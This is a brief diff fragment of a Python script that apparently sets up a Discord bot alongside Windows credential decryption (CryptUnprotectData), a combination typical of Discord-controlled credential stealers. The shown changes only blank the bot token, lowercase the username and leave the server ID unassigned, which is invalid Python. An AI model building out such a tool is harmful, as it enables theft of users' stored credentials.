@@ -24,9 +24,9 @@ from discord.ext import commands
 from win32crypt import CryptUnprotectData
 
 # Constants
-TOKEN = "TOKEN" # Discord bot token
-USERNAME = os.getenv("USERNAME")  # Windows username
-GUILD_ID = 0  # Replace with your actual server ID (Interger)
+TOKEN = "" # Discord bot token
+USERNAME = os.getenv("USERNAME").lower()  # Windows usernamew
+GUILD_ID =   # Replace with your actual server ID (Interger)
 
 # Vars for bot
 intents = discord.Intents.default()
